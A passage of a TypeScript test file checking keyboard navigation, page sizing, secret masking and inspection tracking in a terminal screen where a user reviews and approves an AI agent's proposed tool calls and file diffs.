        state = stateAfter(state, '', PGDN);
        if (state.cursor.line !== lineNumber) break;
        // Each page continues exactly where the previous one was cut: the page's own `next`.
        expect(state.cursor).toEqual(before.next);
        inside.push(state.cursor);
      }
      expect(inside.length, 'the line spans several pages').toBeGreaterThan(2);
      expect(inside.every((cursor) => cursor.offset > lineStart)).toBe(true);
      expect(inside.map((cursor) => cursor.offset)).toEqual(
        [...inside.map((cursor) => cursor.offset)].sort((a, b) => a - b),
      );
      const middle = fullViewOf(long, { cursor: must(inside[1], 'cursor') });
      expect(
        stateAfter(middle, '', PGUP).cursor,
        'PgUp: the start of the current line first',
      ).toEqual({ line: lineNumber, offset: 0 });
      expect(stateAfter(middle, '', UP).cursor, 'Up: the same').toEqual({
        line: lineNumber,
        offset: 0,
      });
    });

    it('PgDn reaches the end of a long LAST line: every character of it is on some page', () => {
      const long = 4000;
      let state = fullViewOf(replacement(null, `${'x'.repeat(long)}\n`));
      let covered = 0;
      let last: ReviewPage | undefined;
      for (let page = 0; page < 40; page++) {
        last = drawnPage(state);
        covered += last.visibleSource
          .filter((range) => range.field === 2)
          .reduce((sum, range) => sum + range.end - range.start, 0);
        const action = pressFull(state, '', PGDN);
        if (action.kind !== 'state') break;
        state = action.state;
      }
      expect(last?.next, 'the walk reaches a page that ends the line').toBeUndefined();
      expect(covered).toBeGreaterThanOrEqual(long);
    });
  });

  describe('Home and End', () => {
    it('Home goes to the top, the target, and does nothing there', () => {
      const middle = fullViewOf(preview(), on('=20'));
      expect(stateAfter(middle, '', HOME).cursor).toEqual({ line: 0, offset: 0 });
      expect(pressFull(top(), '', HOME)).toEqual({ kind: 'none' });
    });

    it('Home goes to the first LISTED line when the document begins with a skipped copy', () => {
      const { diff } = preview();
      if (diff === undefined) throw new Error('missing diff');
      const bare: ToolPreview = { kind: 'operation', fields: [], diff };
      const noTarget = fullViewOf(bare, { cursor: { line: 40, offset: 0 } });
      const document = documentOf(noTarget);
      expect(document.lines[0]?.label).toBe('=before 1');
      expect(document.lines[0]?.fullSkip).toBe(true);
      expect(stateAfter(noTarget, '', HOME).cursor).toEqual({ line: 1, offset: 0 });
    });

    it('End goes to the start of the last full page — the cursor Down stops at — and does nothing there', () => {
      const middle = fullViewOf(preview(), on('=20'));
      const document = documentOf(middle);
      const ended = stateAfter(middle, '', END);
      expect(ended.cursor).toEqual(lastPageStart(document, scrollViewOf(ended, drawnPage(ended))));
      expect(ended.cursor).toEqual({ line: lineIndex(document, '+50'), offset: 0 });
      expect(drawnPage(ended).next).toBeUndefined();
      expect(pressFull(ended, '', END)).toEqual({ kind: 'none' });
      // A cursor a search left past the last full page is brought back to it.
      expect(stateAfter(fullViewOf(preview(), on('=57')), '', END).cursor).toEqual(ended.cursor);
    });

    it('a document that fits one page does not scroll at all: Down, PgDn, End and Tab do nothing', () => {
      const small = fullViewOf(editedFilePreview(3, { 2: 'two' }));
      expect(drawnPage(small).next).toBeUndefined();
      for (const [input, key] of [
        ['', DOWN],
        ['j', {}],
        ['', PGDN],
        [' ', {}],
        ['', END],
        ['', HOME],
        ['', UP],
        ['', PGUP],
      ] as const)
        expect(pressFull(small, input, key), `${input}${JSON.stringify(key)}`).toEqual({
          kind: 'none',
        });
    });
  });

  describe('the geometry follows the view modes', () => {
    /** End lands on the last page that reaches the end of the document: Down goes no further, and one listed line up the end is off the page. */
    const expectEndIsTheLastFullPage = (state: ToolReviewState) => {
      const ended = stateAfter(state, '', END);
      const page = drawnPage(ended);
      expect(page.next, 'the page End lands on reaches the end').toBeUndefined();
      expect(pressFull(ended, '', DOWN), 'Down stops where End lands').toEqual({ kind: 'none' });
      const above = stateAfter(ended, '', UP);
      expect(
        drawnPage(above).next,
        'a line earlier the page no longer reaches the end',
      ).toBeDefined();
    };

    it('in code-point view a line takes more rows, and End still lands on the last page that ends the document', () => {
      // Twenty NON-ASCII characters per line: one row as written, three rows as `<U+XXXX>` tokens (8 columns each).
      const wide = editedLines(
        Array.from({ length: 60 }, (_, index) => `row ${index + 1} ${'éıü界é'.repeat(4)}`),
        { 10: 'changed' },
      );
      const numeric = fullViewOf(wide, { numeric: true });
      const asWritten = drawnPage(fullViewOf(wide)).labels;
      expect(new Set(asWritten).size, 'as written, each line is one row').toBe(asWritten.length);
      const labels = drawnPage(numeric).labels;
      expect(labels, 'the page is 11 rows').toHaveLength(11);
      expect(new Set(labels).size, 'a line takes several rows, so its label repeats').toBeLessThan(
        labels.length,
      );
      expectEndIsTheLastFullPage(numeric);
    });

    it('with masks revealed a line takes the rows of its real text, and End still lands on the last page that ends the document', () => {
      const credential = `sk-proj-${'a'.repeat(130)}`;
      const lines = Array.from({ length: 60 }, (_, index) => `line ${index + 1}`);
      lines[59] = credential;
      const revealed = fullViewOf(editedLines(lines, { 10: 'ten' }), { reveal: true });
      expect(documentOf(revealed).masks.length).toBeGreaterThan(0);
      const labels = drawnPage(stateAfter(revealed, '', END)).labels;
      expect(labels.at(-1), 'the credential line is the last row').toBe('=60');
      expect(
        labels.filter((label) => label === '=60').length,
        'drawn over several rows',
      ).toBeGreaterThan(1);
      expectEndIsTheLastFullPage(revealed);
    });
  });

  describe('Tab and Shift+Tab: the next and the previous change', () => {
    it('Tab visits each change in turn, opening three unchanged lines above it, and says so past the last', () => {
      let state = top();
      const stops: (string | undefined)[] = [];
      const openings: (readonly string[])[] = [];
      for (let change = 0; change < 3; change++) {
        state = stateAfter(state, '', TAB);
        stops.push(labelOf(state));
        openings.push(drawnPage(state).rows.slice(0, 4));
      }
      expect(stops).toEqual(['=7', '=27', '=47']);
      expect(openings).toEqual([
        ['=7 line 7', '=8 line 8', '=9 line 9', '-10 line 10'],
        ['=27 line 27', '=28 line 28', '=29 line 29', '-30 line 30'],
        ['=47 line 47', '=48 line 48', '=49 line 49', '-50 line 50'],
      ]);
      expect(pressFull(state, '', TAB)).toEqual({
        kind: 'state',
        state: { ...state, message: 'No later change' },
      });
    });

    it('Shift+Tab visits them backwards — strictly, every changed line shown on some landing — and says so before the first', () => {
      const start = fullViewOf(preview(), on('=47'));
      const document = documentOf(start);
      const walk = tabWalk(start, true);
      let previous = start;
      for (const landing of walk.landings) {
        expect(
          compareCursorsForTest(landing.state.cursor, previous.cursor),
          'strictly backward',
        ).toBeLessThan(0);
        previous = landing.state;
      }
      // The walk ends on the opening of the first change, and every changed line above `=47` was on a page it landed on.
      expect(labelOf(walk.last)).toBe('=7');
      expect(everyChangedLineSeen(walk, document)).toEqual([]);
      expect(walk.refusal).toBe('No earlier change');
      expect(walk.refusedAt.changesAbove, 'only once nothing changed is above').toBe(0);
      // Each landing draws the nearest changed line above the page it left.
      for (const landing of walk.landings)
        if (landing.nextUnseen !== undefined) expect(landing.changed).toContain(landing.nextUnseen);
      // Before any change at all — the top — there is none to go back to.
      expect(pressFull(top(), '', SHIFT_TAB)).toEqual({
        kind: 'state',
        state: { ...top(), message: 'No earlier change' },
      });
    });

    it('from inside a change, Tab goes to the NEXT one and Shift+Tab to this change’s own opening', () => {
      const inside = fullViewOf(preview(), on('+10'));
      expect(labelOf(stateAfter(inside, '', TAB))).toBe('=27');
      expect(labelOf(stateAfter(inside, '', SHIFT_TAB))).toBe('=7');
    });

    it('two edits six unchanged lines apart are ONE change and two edits seven apart are two — and Tab shows every changed line of either', () => {
      const apart = (between: number) =>
        fullViewOf(editedFilePreview(60, { 10: 'first', [11 + between]: 'second', 40: 'third' }));
      for (const [between, starts] of [
        [6, 2],
        [7, 3],
      ] as const) {
        const state = apart(between);
        const document = documentOf(state);
        // The change and its opening are counted as before: six lines join two edits, seven do not.
        expect(document.changeStarts, `${between} lines apart`).toHaveLength(starts);
        // Tab walks a merged change page by page, so there are at least as many landings as openings — and none is skipped.
        const walk = tabWalk(state);
        expect(walk.landings.length).toBeGreaterThanOrEqual(starts);
        expect(labelOf(walk.landings[0]?.state ?? state), 'the first opening').toBe('=7');
        expect(labelOf(walk.last), 'the last change opens on its own context').toBe('=37');
        expect(everyChangedLineSeen(walk, document), `${between} lines apart`).toEqual([]);
        expect(walk.refusal).toBe('No later change');
        expect(walk.refusedAt.changesBelow).toBe(0);
        for (const landing of walk.landings)
          if (landing.nextUnseen !== undefined)
            expect(landing.changed).toContain(landing.nextUnseen);
      }
    });

    it('a change below the last full page is reached by landing ON that page, and then there is none later', () => {
      const late = fullViewOf(editedFilePreview(60, { 10: 'ten', 58: 'fifty-eight' }));
      const document = documentOf(late);
      const first = stateAfter(late, '', TAB);
      expect(labelOf(first)).toBe('=7');
      const second = stateAfter(first, '', TAB);
      const page = drawnPage(second);
      expect(second.cursor).toEqual(lastPageStart(document, scrollViewOf(second, page)));
      expect(page.rows).toContain('-58 line 58');
      expect(page.rows).toContain('+58 fifty-eight');
      // Both lines of the late change are drawn; the two of the first change are the ones above the page.
      expect(page.changesBelow, 'nothing of the late change is left below').toBe(0);
      expect(page.changesAbove).toBe(2);
      expect(pressFull(second, '', TAB)).toEqual({
        kind: 'state',
        state: { ...second, message: 'No later change' },
      });
    });

    it('Tab on a document whose only change is already on its single page says there is no later change', () => {
      const small = fullViewOf(editedFilePreview(3, { 2: 'two' }));
      expect(pressFull(small, '', TAB)).toEqual({
        kind: 'state',
        state: { ...small, message: 'No later change' },
      });
    });
  });

  describe('what a motion may and may not do', () => {
    const keys: readonly (readonly [string, string, ChatKey])[] = [
      ['Down', '', DOWN],
      ['j', 'j', {}],
      ['Up', '', UP],
      ['k', 'k', {}],
      ['PgDn', '', PGDN],
      ['Space', ' ', {}],
      ['PgUp', '', PGUP],
      ['Home', '', HOME],
      ['End', '', END],
      ['Tab', '', TAB],
      ['Shift+Tab', '', SHIFT_TAB],
    ];
    const middle = () => fullViewOf(preview(), on('=20'));

    it('every motion key moves from the middle of the document — so the next test’s "nothing" is a real nothing', () => {
      for (const [name, input, key] of keys)
        expect(pressFull(middle(), input, key).kind, name).toBe('state');
    });

    it('does nothing when the frame is not visible', () => {
      const state = middle();
      const page = drawnPage(state);
      for (const [name, input, key] of keys)
        expect(reduceToolReviewKey(state, input, key, false, page, true, 0), name).toEqual({
          kind: 'none',
        });
    });

    it('does nothing when no page has been drawn yet', () => {
      for (const [name, input, key] of keys)
        expect(reduceToolReviewKey(middle(), input, key, true, undefined, true, 0), name).toEqual({
          kind: 'none',
        });
    });

    it('a successful move clears the previous message', () => {
      for (const [name, input, key] of keys) {
        const moved = stateAfter({ ...middle(), message: 'No later visible match' }, input, key);
        expect(moved.message, name).toBe('');
      }
    });

    it('a message does not change the page: the same body, the same End, a full last page', () => {
      // The chrome always reserves its message row (blank when there is none), so a message appearing or clearing never
      // resizes the body — and a motion that clears it lands exactly where it would have without one.
      const clean = middle();
      const withMessage = { ...middle(), message: 'No later visible match' };
      expect(drawnPage(withMessage).rowLimit).toBe(ROWS);
      expect(drawnPage(withMessage)).toEqual(drawnPage(clean));
      const endClean = stateAfter(clean, '', END);
      const endMessage = stateAfter(withMessage, '', END);
      expect(endMessage.message).toBe('');
      expect(endMessage.cursor).toEqual(endClean.cursor);
      expect(endMessage.cursor).toEqual({
        line: lineIndex(documentOf(endMessage), '+50'),
        offset: 0,
      });
      const last = drawnPage(endMessage);
      expect(last.rowLimit).toBe(ROWS);
      expect(last.next).toBeUndefined();
      expect(last.rows, 'no blank row under it').toHaveLength(ROWS);
    });

    it('never sizes a page past the 200-row cap, with a message showing or not', () => {
      const big = fullViewOf(editedFilePreview(400, { 5: 'five' }), {
        message: 'No later visible match',
      });
      const document = documentOf(big);
      const tall = must(toolReviewPage(big, 80, 300), 'page');
      expect(tall.rowLimit).toBe(200);
      const action = reduceToolReviewKey(big, '', END, true, tall, true, 0);
      if (action.kind !== 'state') throw new Error(`End gave ${action.kind}`);
      expect(ordinalOf(document, action.state.cursor)).toBe(listingOf(document).length - 200);
    });

    it('a key that cannot move takes a stale note down: none when there is no note, a state with the note cleared when there is', () => {
      // Nothing to clear: the key does nothing at all, which is `none` (typing evidence like any other key).
      expect(pressFull(top(), '', UP)).toEqual({ kind: 'none' });
      expect(pressFull(top(), '', HOME)).toEqual({ kind: 'none' });
      // A note on screen that the key cannot answer by moving: the note goes, and nothing else changes.
      const atEnd = stateAfter(middle(), '', END);
      const cannotMove: readonly (readonly [string, ToolReviewState, string, ChatKey])[] = [
        ['Up at the top', top(), '', UP],
        ['k at the top', top(), 'k', {}],
        ['PgUp at the top', top(), '', PGUP],
        ['Home at the top', top(), '', HOME],
        ['Down at the end', atEnd, '', DOWN],
        ['j at the end', atEnd, 'j', {}],
        ['PgDn at the last page', atEnd, '', PGDN],
        ['Space at the last page', atEnd, ' ', {}],
        ['End at the last page', atEnd, '', END],
      ];
      for (const [name, state, input, key] of cannotMove) {
        const noted = { ...state, message: 'No later visible match' };
        expect(pressFull(noted, input, key), name).toEqual({
          kind: 'state',
          state: { ...noted, message: '' },
        });
        expect(pressFull(state, input, key), `${name} (no note)`).toEqual({ kind: 'none' });
      }
    });

    it('Tab at the last change says so; a key that cannot move then takes the note down; a move takes it down too', () => {
      let state = top();
      for (let change = 0; change < 3; change++) state = stateAfter(state, '', TAB);
      const refused = stateAfter(state, '', TAB);
      expect(refused.message).toBe('No later change');
      expect(refused.cursor, 'the refusal moves nothing').toEqual(state.cursor);
      // At the end of the document Down cannot move, and the stale note goes.
      const ended = stateAfter(state, '', END);
      const atEndNoted = stateAfter(ended, '', TAB);
      expect(atEndNoted.message).toBe('No later change');
      const cleared = stateAfter(atEndNoted, '', DOWN);
      expect(cleared.message).toBe('');
      expect(cleared.cursor).toEqual(ended.cursor);
      // And with nothing left to clear it is `none` again.
      expect(pressFull(cleared, '', DOWN)).toEqual({ kind: 'none' });
      // A successful move clears it as well.
      expect(stateAfter(refused, '', UP).message).toBe('');
    });

    it('moving never changes anything but the cursor and the message', () => {
      const before = middle();
      for (const [name, input, key] of keys) {
        const after = stateAfter(before, input, key);
        expect({ ...after, cursor: before.cursor, message: before.message }, name).toEqual(before);
      }
    });
  });

  describe('through the store', () => {
    it('keys reach the model: v opens on the change, then Down / Tab / End / Home / PgDn move the cursor on acknowledged frames', () => {
      const store = createChatStore(false, undefined, INLINE_TRANSCRIPT_BOUND);
      void store.requestApproval(
        { toolId: 'write_file', action: 'fs_write', preview: { path: 'src/app.ts' } },
        true,
        undefined,
        { callId: 'store-motion', preview: preview() },
      );
      store.bindReviewVisibility(() => true);
      // The host acknowledges the frame it drew after every change; a key that arrives before that moves nothing.
      const settle = () => {
        const review = must(store.getSnapshot().review, 'review');
        store.acknowledgeReviewFrame(review, toolReviewPage(review, 80, 24));
        return must(store.getSnapshot().review, 'review');
      };
      const press = (input: string, key: ChatKey = {}) => {
        expect(store.handleReviewInput(input, key)).toBe('handled');
        return settle();
      };
      settle();
      let review = press('v');
      expect(review.screen).toBe('full');
      expect(labelOf(review)).toBe('=7');
      const opened = review.cursor.line;
      review = press('', DOWN);
      expect(labelOf(review), 'one listed line down from the opening').toBe('=8');
      review = press('', TAB);
      expect(labelOf(review)).toBe('=27');
      review = press('', END);
      expect(labelOf(review)).toBe('+50');
      review = press('', HOME);
      expect(review.cursor).toEqual({ line: 0, offset: 0 });
      review = press('', PGDN);
      expect(review.cursor.line).toBeGreaterThan(opened);
      expect(review.message).toBe('');
    });
  });
});

describe('[v] opens the full view where the card does (ADR-0134 §4)', () => {
  const cardOf = (preview: ToolPreview, patch: Partial<ToolReviewState> = {}) => {
    const state = {
      ...initialToolReview('approval', 'call', createReviewDocument(preview)),
      ...patch,
    };
    return { state, page: toolReviewPage(state, 80, 24) };
  };
  const open = ({ state, page }: ReturnType<typeof cardOf>): ToolReviewState => {
    const action = reduceToolReviewKey(state, 'v', {}, true, page, true, 0);
    if (action.kind !== 'state') throw new Error(`v gave ${action.kind}`);
    expect(action.state.screen).toBe('full');
    return action.state;
  };
  const top = { line: 0, offset: 0 };

  it('opens on the first change with three unchanged lines above it, not on line 1', () => {
    const opened = open(cardOf(editedFilePreview(60, { 10: 'ten' })));
    expect(labelOf(opened)).toBe('=7');
    expect(drawnPage(opened).rows.slice(0, 4)).toEqual([
      '=7 line 7',
      '=8 line 8',
      '=9 line 9',
      '-10 line 10',
    ]);
  });

  it('never opens above the first unchanged line a change has, and not on the target', () => {
    const second = open(cardOf(editedFilePreview(60, { 2: 'two' })));
    expect(drawnPage(second).rows.slice(0, 3)).toEqual(['=1 line 1', '-2 line 2', '+2 two']);
    const first = open(cardOf(editedFilePreview(60, { 1: 'one' })));
    expect(drawnPage(first).rows.slice(0, 2)).toEqual(['-1 line 1', '+1 one']);
  });

  it('opens at the top when the card had to shorten the target — the target is read first', () => {
    const long = cardOf(editedFilePreview(60, { 10: 'ten' }, 'd'.repeat(200)));
    expect(long.page?.requiredTarget, 'the card really did shorten it').toBeDefined();
    expect(open(long).cursor).toEqual(top);
    // The same change under a target that fits opens on the change: the target is what decides.
    expect(open(cardOf(editedFilePreview(60, { 10: 'ten' }))).cursor).not.toEqual(top);
  });

  it('opens at the top when the state already remembers a shortened target the page no longer reports', () => {
    const remembered = cardOf(editedFilePreview(60, { 10: 'ten' }), {
      requiredTarget: { field: 0, start: 0, end: 200 },
    });
    expect(remembered.page?.requiredTarget).toBeUndefined();
    expect(open(remembered).cursor).toEqual(top);
  });

  it('opens at the top when field rows come before the diff — they are the call’s identity', () => {
    const withFields: ToolPreview = {
      ...editedFilePreview(60, { 10: 'ten' }),
      fields: [{ name: 'mode', value: 'overwrite' }],
    };
    const opened = open(cardOf(withFields));
    expect(opened.cursor).toEqual(top);
    expect(drawnPage(opened).rows.slice(0, 3)).toEqual([
      'target src/app.ts',
      'field name mode',
      'field value overwrite',
    ]);
  });

  it('opens at the top when the document has no change to open on', () => {
    expect(
      open(cardOf({ kind: 'operation', target: 'git', fields: [{ name: 'args', value: '[]' }] }))
        .cursor,
    ).toEqual(top);
  });

  it('opens at the top when a diff changed nothing (a rewrite of identical content)', () => {
    const rewrite = editedFilePreview(10, {});
    expect(createReviewDocument(rewrite).firstChangedLine).toBeUndefined();
    expect(open(cardOf(rewrite)).cursor).toEqual(top);
  });

  it('opens at the top when the card page is undefined — nothing was drawn to say the target fits', () => {
    const { state } = cardOf(editedFilePreview(60, { 10: 'ten' }));
    expect(open({ state, page: undefined }).cursor).toEqual(top);
  });
});

describe('[r] reveals only where something is masked (ADR-0134 §5)', () => {
  const secret = () =>
    replacement('Bearer sk-proj-abcdefghijklmnopqrstuvw', 'Bearer sk-proj-zyxwvutsrqponmlkjihgfed');
  const press = (state: ToolReviewState) =>
    reduceToolReviewKey(state, 'r', {}, true, undefined, true, 0);

  it('does nothing on a document without masks: reveal stays false', () => {
    for (const kind of ['approval', 'details'] as const) {
      const state = {
        ...initialToolReview(
          kind,
          'call',
          createReviewDocument(editedFilePreview(8, { 4: 'four' })),
        ),
        screen: 'full' as const,
      };
      expect(documentOf(state).masks).toHaveLength(0);
      expect(press(state), kind).toEqual({ kind: 'none' });
    }
  });

  it('toggles reveal on a document with masks, on the approval and on the details view', () => {
    for (const kind of ['approval', 'details'] as const) {
      const state = {
        ...initialToolReview(kind, 'call', createReviewDocument(secret())),
        screen: 'full' as const,
      };
      expect(documentOf(state).masks.length).toBeGreaterThan(0);
      const on = press(state);
      expect(on, kind).toMatchObject({ kind: 'state', state: { reveal: true } });
      if (on.kind !== 'state') throw new Error('expected a state');
      expect(press(on.state), kind).toMatchObject({ kind: 'state', state: { reveal: false } });
    }
  });

  it('clears the message, as every state change of the view does', () => {
    const state = {
      ...fullViewOf(secret()),
      message: 'No later visible match',
    };
    expect(press(state)).toMatchObject({ kind: 'state', state: { reveal: true, message: '' } });
  });
});

describe('inspectionPending names what an affirmative answer still owes (ADR-0134 §3)', () => {
  const secret = () =>
    replacement('Bearer sk-proj-abcdefghijklmnopqrstuvw', 'Bearer sk-proj-zyxwvutsrqponmlkjihgfed');
  const longTarget = () => fullViewOf(editedFilePreview(8, { 4: 'four' }, 'd'.repeat(200)));
  const masked = () => fullViewOf(secret(), { reveal: true });

  it('owes nothing for a clean document', () => {
    const clean = fullViewOf(editedFilePreview(8, { 4: 'four' }));
    expect(inspectionPending(clean)).toEqual({ target: false, masks: 0 });
    expect(inspectionPending(clean, drawnPage(clean).requiredTarget)).toEqual({
      target: false,
      masks: 0,
    });
  });

  it('owes the target until the WHOLE target range has been on screen', () => {
    const state = longTarget();
    const shown = must(drawnPage(state).requiredTarget, 'the shortened target');
    expect(shown).toEqual({ field: 0, start: 0, end: 200 });
    expect(inspectionPending(state, shown)).toEqual({ target: true, masks: 0 });
    // The tail of the target alone does not settle it …
    const tail = fullViewOf(editedFilePreview(8, { 4: 'four' }, 'd'.repeat(200)), {
      cursor: { line: 0, offset: 100 },
    });
    const tailOnly = acknowledgeToolReview(tail, drawnPage(tail));
    expect(tailOnly.inspected).toEqual([{ field: 0, start: 100, end: 200 }]);
    expect(inspectionPending(tailOnly, shown)).toEqual({ target: true, masks: 0 });
    // … the top does, and together they cover it.
    const whole = acknowledgeToolReview(
      tailOnly,
      drawnPage({ ...tailOnly, cursor: { line: 0, offset: 0 } }),
    );
    expect(whole.inspected).toEqual([{ field: 0, start: 0, end: 200 }]);
    expect(inspectionPending(whole, shown)).toEqual({ target: false, masks: 0 });
  });

  it('counts the masked ranges still owed, and the count drops as each is revealed and drawn', () => {
    let state = masked();
    const document = documentOf(state);
    expect(document.required).toHaveLength(2);
    expect(inspectionPending(state)).toEqual({ target: false, masks: 2 });
    // Two rows: the target and the removed line, whose mask is the first of the two.
    const first = projectReviewPage(document, REVIEW_START, 78, 2, true);
    expect(first.next).toEqual({ line: 2, offset: 0 });
    state = acknowledgeToolReview(state, first);
    expect(inspectionPending(state)).toEqual({ target: false, masks: 1 });
    state = acknowledgeToolReview(
      state,
      projectReviewPage(document, must(first.next, 'next'), 78, 2, true),
    );
    expect(inspectionPending(state)).toEqual({ target: false, masks: 0 });
  });

  it('owes the masks while they are only drawn masked: a page shown without reveal inspects none of them', () => {
    const hidden = fullViewOf(secret(), { reveal: false });
    const acknowledged = acknowledgeToolReview(
      hidden,
      projectReviewPage(documentOf(hidden), REVIEW_START, 78, 20),
    );
    expect(inspectionPending(acknowledged)).toEqual({ target: false, masks: 2 });
  });

  it('is the one definition of reviewInspected: nothing owed ⇔ inspected, for every state below', () => {
    const shown = must(drawnPage(longTarget()).requiredTarget, 'target');
    const acknowledged = (state: ToolReviewState): ToolReviewState =>
      acknowledgeToolReview(state, drawnPage(state));
    const revealedAll = (): ToolReviewState => {
      const state = masked();
      return acknowledgeToolReview(
        state,
        projectReviewPage(documentOf(state), REVIEW_START, 78, 20, true),
      );
    };
    const table: readonly (readonly [string, ToolReviewState, SourceRangeOrUndefined, boolean])[] =
      [
        ['clean', fullViewOf(editedFilePreview(8, { 4: 'four' })), undefined, true],
        ['a target the card shortened, nothing inspected', longTarget(), shown, false],
        // The state learns the target only once a frame is acknowledged: this is why the page's own range is passed.
        ['the same, before any frame told the state', longTarget(), undefined, true],
        ['the same, once its page was acknowledged', acknowledged(longTarget()), shown, true],
        ['masks, nothing revealed', masked(), undefined, false],
        ['masks, revealed and drawn', revealedAll(), undefined, true],
      ];
    for (const [name, state, target, expected] of table) {
      const pending = inspectionPending(state, target);
      expect(reviewInspected(state, target), name).toBe(!pending.target && pending.masks === 0);
      expect(reviewInspected(state, target), name).toBe(expected);
    }
  });
});
type SourceRangeOrUndefined = { field: number; start: number; end: number } | undefined;

describe('the tool-call list keys (ADR-0134 §6)', () => {
  const list = (selected = 0): ToolReviewState => ({
    ...initialToolReview('details', 'call'),
    selected,
  });
  const press = (state: ToolReviewState, input: string, key: ChatKey, count = 25, visible = true) =>
    reduceToolReviewKey(state, input, key, visible, undefined, false, count);
  const selectedAfter = (state: ToolReviewState, key: ChatKey, count = 25): number => {
    const action = press(state, '', key, count);
    if (action.kind !== 'state') throw new Error(`gave ${action.kind}`);
    return action.state.selected;
  };

  it('is a list screen when there is no document', () => {
    expect(list().screen).toBe('list');
  });

  it('Up and Down move one call and clamp at both ends', () => {
    expect(selectedAfter(list(5), UP)).toBe(4);
    expect(selectedAfter(list(5), DOWN)).toBe(6);
    expect(selectedAfter(list(0), UP), 'the oldest stays the oldest').toBe(0);
    expect(selectedAfter(list(24), DOWN), 'the newest stays the newest').toBe(24);
  });

  it('PgUp and PgDn move ten calls and clamp at both ends', () => {
    expect(selectedAfter(list(12), PGUP)).toBe(2);
    expect(selectedAfter(list(12), PGDN)).toBe(22);
    expect(selectedAfter(list(3), PGUP)).toBe(0);
    expect(selectedAfter(list(20), PGDN)).toBe(24);
    expect(selectedAfter(list(24), PGDN)).toBe(24);
    expect(selectedAfter(list(0), PGUP)).toBe(0);
  });

  it('Home selects the oldest call and End the newest, wherever the selection is', () => {
    expect(selectedAfter(list(17), HOME)).toBe(0);
    expect(selectedAfter(list(0), HOME)).toBe(0);
    expect(selectedAfter(list(3), END)).toBe(24);
    expect(selectedAfter(list(24), END)).toBe(24);
    expect(selectedAfter(list(0), END, 1), 'a single call is both ends').toBe(0);
    expect(selectedAfter(list(0), END, 0), 'no calls at all').toBe(0);
  });

  it('moves exactly ten calls a page on a 30-call list, and clamps at both ends', () => {
    expect(selectedAfter(list(0), PGDN, 30), 'PgDn from the oldest').toBe(10);
    expect(selectedAfter(list(25), PGUP, 30), 'PgUp from 25').toBe(15);
    expect(selectedAfter(list(10), PGDN, 30)).toBe(20);
    expect(selectedAfter(list(25), PGDN, 30), 'clamped at the newest').toBe(29);
    expect(selectedAfter(list(5), PGUP, 30), 'clamped at the oldest').toBe(0);
  });

  it('Enter opens the selected call, and nothing else does', () => {
    expect(press(list(7), '', { return: true })).toEqual({ kind: 'select' });
    for (const [input, key] of [
      ['j', {}],
      ['k', {}],
      [' ', {}],
      ['v', {}],
      ['r', {}],
      ['', TAB],
      ['', { leftArrow: true }],
    ] as const)
      expect(press(list(7), input, key), `${input}${JSON.stringify(key)}`).toEqual({
        kind: 'none',
      });
  });

  it('answers nothing while the frame is not visible', () => {
    for (const key of [UP, DOWN, PGUP, PGDN, HOME, END, { return: true }])
      expect(press(list(7), '', key, 25, false), JSON.stringify(key)).toEqual({ kind: 'none' });
  });

  it('through the store: opens on the newest call, and Home / End / PgUp / PgDn / Up move it; Enter opens the selected one', () => {
    const store = createChatStore(false, undefined, INLINE_TRANSCRIPT_BOUND);
    for (let index = 0; index < 25; index++)
      store.applyToolLiveEvent({ phase: 'started', callId: `call-${index}`, toolId: 'git_status' });
    store.openDetails();
    store.bindReviewVisibility(() => true);
    const now = () => store.getSnapshot().review;
    expect([now()?.selected, now()?.callId]).toEqual([24, 'call-24']);
    const visit = (key: ChatKey): [number | undefined, string | undefined] => {
      store.handleReviewInput('', key);
      return [now()?.selected, now()?.callId];
    };
    expect(visit(HOME)).toEqual([0, 'call-0']);
    expect(visit(PGDN)).toEqual([10, 'call-10']);
    expect(visit(PGDN)).toEqual([20, 'call-20']);
    expect(visit(PGDN), 'clamped').toEqual([24, 'call-24']);
    expect(visit(PGUP)).toEqual([14, 'call-14']);
    expect(visit(END)).toEqual([24, 'call-24']);
    expect(visit(UP)).toEqual([23, 'call-23']);
    store.handleReviewInput('', { return: true });
    expect(now()?.screen).toBe('full');
    expect(now()?.callId).toBe('call-23');
  });
});

describe('toolReviewPage sizes the full view body from the chrome the screen spends (ADR-0134 §3)', () => {
  /** Plenty of lines, so a page is always full. */
  const big = () => editedFilePreview(400, { 5: 'five' });
  const full = (patch: Partial<ToolReviewState> = {}) => fullViewOf(big(), patch);

  it.each([
    [24, 12, 11],
    [24, 14, 9],
    [24, 5, 18],
    [40, 10, 29],
    [50, 3, 46],
    [500, 1, 200],
    [250, 1, 200],
    [400, 12, 200],
    [400, 1, 200],
    [10, 30, 1],
    [24, 22, 1],
    [24, 23, 1],
  ])('at %i rows with %i chrome rows the body is %i rows', (rows, chrome, expected) => {
    const page = must(toolReviewPage(full(), 80, rows, chrome), 'page');
    expect(page.rowLimit).toBe(expected);
    expect(page.rows).toHaveLength(expected);
  });

  it('without a chrome count a fixed allowance of 12 stands in, plus a row while searching — and nothing for a message', () => {
    const limit = (patch: Partial<ToolReviewState>) => drawnPage(full(patch)).rowLimit;
    expect(limit({})).toBe(11);
    expect(limit({ searching: true, query: '' })).toBe(10);
    // The message row is always reserved inside the 12, so a message costs the body nothing.
    expect(limit({ message: 'No later change' })).toBe(11);
    expect(limit({ searching: true, query: '', message: 'No later change' })).toBe(10);
  });

  it('an explicit chrome count is used as given, whatever the search and message state', () => {
    const page = toolReviewPage(
      full({ searching: true, query: '', message: 'No later change' }),
      80,
      24,
      12,
    );
    expect(page?.rowLimit).toBe(11);
  });

  it('caps the body at 200 rows however tall the terminal is, with or without a chrome count', () => {
    const tall = must(toolReviewPage(full(), 80, 400), 'page');
    expect(tall.rowLimit).toBe(200);
    expect(tall.rows).toHaveLength(200);
    for (const chrome of [0, 12, 40]) {
      const page = must(toolReviewPage(full(), 80, 400, chrome), 'page');
      expect(page.rowLimit, `chrome ${chrome}`).toBe(200);
      expect(page.rows).toHaveLength(200);
    }
    // Around the cap it is exact: 12 chrome + 1 spare rows put 175, 199 and 200 body rows at these heights.
    expect(must(toolReviewPage(full(), 80, 188), 'page').rowLimit).toBe(175);
    expect(must(toolReviewPage(full(), 80, 213), 'page').rowLimit).toBe(200);
    expect(must(toolReviewPage(full(), 80, 212), 'page').rowLimit).toBe(199);
  });

  it('a message does not change the page for the same chrome count, at any count', () => {
    for (const chrome of [undefined, 3, 12, 14, 30]) {
      const clean = toolReviewPage(full(), 80, 24, chrome);
      const withMessage = toolReviewPage(full({ message: 'No later change' }), 80, 24, chrome);
      expect(withMessage, `chrome ${chrome}`).toEqual(clean);
    }
  });

  it('the card page is not resized by a chrome count — but the full view is', () => {
